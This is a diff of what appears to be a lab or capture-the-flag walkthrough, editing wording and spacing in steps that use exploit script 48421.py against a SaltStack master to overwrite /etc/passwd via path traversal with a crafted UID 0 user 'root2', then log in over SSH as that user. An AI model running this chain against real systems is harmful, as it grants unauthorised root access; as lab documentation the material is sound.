@@ -91,9 +91,10 @@ replace the x with the output
 ```
 root2:$1$3/sbSf3N$MlLMTctwM/.BK9GOAmqm3.:0:0:root:/root:/bin/bash
 ```
-upload the file to place the origin one
+upload the file and replace the original one
 ```
-$ python3 48421.py --master 192.168.242.62 --port 4506 --upload-src passwd --upload-dest ../../../../../etc/passwd 
+$ python3 48421.py --master 192.168.242.62 --port 4506 --upload-src passwd --upload-dest ../../../../../etc/passwd
+
 [!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
 /usr/local/lib/python3.13/dist-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
   warn_until(
@@ -105,7 +106,7 @@ $ python3 48421.py --master 192.168.242.62 --port 4506 --upload-src passwd --upl
 ```
 login via ssh with the new user root2
 ```
-─$ ssh root2@192.168.242.62  
+$ ssh root2@192.168.242.62  
 root2@192.168.242.62's password: 
 Last failed login: Sat Jan 31 04:58:59 EST 2026 from 192.168.45.208 on ssh:notty
 There was 1 failed login attempt since the last successful login.
